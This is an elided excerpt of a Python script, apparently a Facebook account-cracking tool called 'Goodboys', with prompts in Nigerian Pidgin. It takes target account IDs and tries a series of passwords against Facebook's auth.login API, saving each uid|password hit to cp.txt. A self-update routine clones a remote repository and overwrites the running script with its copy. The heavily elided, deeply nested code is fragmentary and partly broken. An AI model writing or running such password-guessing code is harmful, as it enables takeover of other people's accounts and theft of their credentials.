...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/GoodBoyC/Goodboys")
			os.system("rm -rf goodboys.py")
			os.system("cp -f goodboys/goodboys.py \\.")
			os.system("rm -rf goodboys")
...
def token_check():
	try:
		...
		print"\033[91;1m[!] TOKEN DON TEAR"
...
def menu():
    ...
    try:
        ...
        logo()
        print("")
        print("\033[91;1m     OGA TOKEN DON TEAR")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        main()
...
def crack_select1():
	...
	if select =="1":
		...
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  GO FIND ID PASTE HERE (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
	...
	print("\033[92;1m  E DON START  🙌\x1b[0m")
	print("\033[94;1m  JUST CHILL OR GO VIEW STATUS \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		...
		try:
			...
			api = 'https://graph.facebook.com/method/auth.login'
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com/" in data.json()['error_msg']:
													print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[GOODBOYS-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
